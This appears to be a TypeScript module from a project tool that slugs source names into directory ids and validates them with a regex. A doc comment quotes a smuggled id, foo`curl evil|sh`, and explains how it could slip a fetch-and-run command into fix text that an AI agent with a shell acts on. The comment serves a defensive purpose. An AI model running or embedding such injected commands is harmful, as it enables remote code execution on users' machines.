import { existsSync } from "node:fs";
import { join } from "node:path";
import { INBOX } from "./manifest.js";

/**
 * A source's directory name is derived from what the source is, and frozen
 * there (`adr:0011-sources-are-named-by-what-they-are`). The readable title
 * lives in the manifest and may drift; the id never does.
 *
 * Slugging: lowercase, accents folded to ASCII, anything outside `[a-z0-9]`
 * collapsed to a single `-`, no leading or trailing `-`.
 */
export class EmptyNameError extends Error {
  constructor(public readonly sourceName: string) {
    super(`"${sourceName}" derives to an empty id — give the source a name`);
    this.name = "EmptyNameError";
  }
}

/**
 * The slugging rule itself, with no opinion about extensions. Empty in, empty
 * out — the caller decides whether that is an error (`deriveId`) or a reason
 * to fall back to the timestamp (`recordingId`, plan 4.16).
 */
export function slugify(text: string): string {
  // Fold accents: NFD splits a letter into its base + combining mark(s); strip
  // the marks to leave the ASCII base (São → Sao). \p{M} matches any mark.
  const folded = text.normalize("NFD").replace(/\p{M}/gu, "");
  const lower = folded.toLowerCase();
  const collapsed = lower.replace(/[^a-z0-9]+/g, "-");
  return collapsed.replace(/^-+|-+$/g, "");
}

export function deriveId(name: string): string {
  // A file source keeps its extension in the id (adr:0011): the directory is
  // `raw/arquitetura-fenix.pdf/` and the citation is `src://arquitetura-fenix.pdf#p12`.
  // The format is part of the identity — a PDF and a DOCX of the same content are
  // different sources. Slug the base name, then reattach the extension.
  // Only a trailing alphabetic group counts as an extension: a recording name
  // carries a date, not a format, so `Fenix weekly 2026-07-31` has none (`.31` is
  // digits) and is slugged whole.
  const extMatch = name.match(/\.[a-z]{1,8}$/i);
  const base = extMatch ? name.slice(0, name.length - extMatch[0].length) : name;
  // **Lowercased, like every other character an id can hold.** It was
  // reattached verbatim, so `Report.PDF` derived `report.PDF` — an id that
  // names a directory and that every citation spells, differing from
  // `report.pdf` in case alone. On a case-insensitive filesystem those are one
  // directory under two ids; on a case-sensitive one they are two sources
  // nothing downstream tells apart. `adr:0021` is what made it worth fixing
  // rather than noting: a camera writes `.JPG` and a phone writes `.MOV`, and
  // until now every id that could exist came from six lowercase extensions.
  const ext = extMatch ? extMatch[0].toLowerCase() : "";
  const trimmed = slugify(base);
  if (trimmed === "") throw new EmptyNameError(name);
  return trimmed + ext;
}

/**
 * The shape `deriveId` and `recordingId` can produce: a slug, optionally
 * carrying an alphabetic extension. Nothing else.
 *
 * It exists because **`listSources` reads directory names verbatim**, and a
 * directory under `raw/` is not necessarily one this application created — it
 * arrives with a `git clone`, an agent's own tools can make one (`raw/` is not
 * gated the way `wiki/` is), and plan group 6 will unpack archives into it. So
 * an id can hold anything a filesystem allows, including shell metacharacters.
 *
 * Use it before putting an id anywhere it would be read as **syntax** rather
 * than as data — a suggested command line above all. A security review caught
 * `source.uncited`'s fix text offering `` `ow source mark <id>` `` for an id
 * that could be `` foo`curl evil|sh` ``, to an agent whose whole purpose is to
 * act on that text and which has a shell.
 */
export function isDerivedId(id: string): boolean {
  return /^[a-z0-9]+(?:-[a-z0-9]+)*(?:\.[a-z]{1,8})?$/.test(id);
}

/** True when a source directory with this id already exists under `raw/`. */
export function isIdTaken(projectRoot: string, id: string): boolean {
  if (id === INBOX) return false; // the inbox is a doorway, not a source
  return existsSync(join(projectRoot, "raw", id));
}
